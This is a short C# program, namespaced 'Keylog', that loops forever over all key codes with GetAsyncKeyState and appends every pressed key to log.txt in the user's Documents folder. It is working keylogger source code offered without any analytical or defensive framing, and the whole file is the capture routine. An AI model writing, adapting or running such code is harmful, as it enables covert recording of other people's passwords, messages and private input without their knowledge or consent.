using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Keylog
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        static void Main(string[] args)
        {
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt";

            // Loop forever to capture key strokes
            while (true)
            {
                // Iterate through all possible key codes
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    // If key is pressed
                    if (keyState == 1 || keyState == -32767)
                    {
                        // then write to the file
                        using (StreamWriter sw = new StreamWriter(filePath, true))
                        {
                            sw.Write((Keys)i + " ");
                        }
                    }
                }
            }
        }
    }
}
